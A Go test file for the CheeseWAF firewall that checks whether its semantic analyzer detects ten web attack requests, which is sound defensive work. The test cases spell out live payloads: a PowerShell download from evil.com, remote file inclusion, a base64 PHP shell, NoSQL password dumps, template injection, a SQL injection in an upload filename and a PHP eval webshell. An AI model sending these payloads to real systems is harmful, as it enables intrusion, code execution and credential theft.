package semantic

import (
	"context"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/LaokeQwQ/CheeseWAF/internal/engine"
)

func TestKimiGapCandidates(t *testing.T) {
	cases := []struct {
		name, method, target, ct, body string
		wantCat                        string
	}{
		{"ps-download", "GET", "/exec?c=(New-Object%20System.Net.WebClient).DownloadFile('http://evil.com/a.exe','C:\\tmp\\a.exe')", "", "", "rce"},
		{"rfi", "GET", "/index.php?include=http://attacker.example.com/logo.txt?", "", "", "lfi"},
		{"data", "GET", "/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", "", "", "lfi"},
		{"docker", "POST", "/api/v1/container?socket=/run/docker.sock", "application/json", `{"Image":"alpine"}`, "lfi"},
		{"eval", "POST", "/admin/db/eval", "application/json", `{"$eval":"db.users.find()"}`, "nosqli"},
		{"mapreduce", "POST", "/api/analytics/mapreduce", "application/json", `{"map":"function() { emit(this._id, this.password); }","reduce":"function(key, vals) { return vals.join(','); }"}`, "nosqli"},
		{"objectspace", "GET", "/render?tpl=<%=ObjectSpace.each_object(Class).to_a%>", "", "", "ssti"},
		{"classloader", "GET", "/freemarker?name=${classLoader.loadClass(\"Exploit\").newInstance()}", "", "", "ssti"},
		{"filename-sqli", "POST", "/upload", "multipart/form-data; boundary=----WebKitFormBoundary", "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"1' UNION SELECT password--.jpg\"\r\n\r\nbinarydata\r\n------WebKitFormBoundary--", "sqli"},
		{"webshell", "POST", "/upload", "multipart/form-data; boundary=----WebKitFormBoundary", "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: image/jpeg\r\n\r\n<?php eval($_POST['cmd']); ?>\r\n------WebKitFormBoundary--", "rce"},
	}
	a := NewAnalyzer("block")
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest(tc.method, "http://x"+tc.target, strings.NewReader(tc.body))
			if tc.ct != "" {
				req.Header.Set("Content-Type", tc.ct)
			}
			var body []byte
			if tc.body != "" {
				body = []byte(tc.body)
			}
			reqCtx := &engine.RequestContext{Request: req, DecodedBody: body, Metadata: map[string]any{}}
			got, err := a.Detect(context.Background(), reqCtx)
			if err != nil {
				t.Fatal(err)
			}
			if got == nil || !got.Detected {
				// debug candidates
				cands := extractCandidates(reqCtx)
				t.Fatalf("missed %s; candidates=%d first=%#v", tc.wantCat, len(cands), firstCand(cands))
			}
			if got.Category != tc.wantCat {
				t.Fatalf("want %s got %s msg=%s", tc.wantCat, got.Category, got.Message)
			}
		})
	}
}

func firstCand(c []semanticCandidate) string {
	if len(c) == 0 {
		return ""
	}
	return c[0].input.Source + ":" + c[0].input.Name + "=" + c[0].text[:min(80, len(c[0].text))]
}
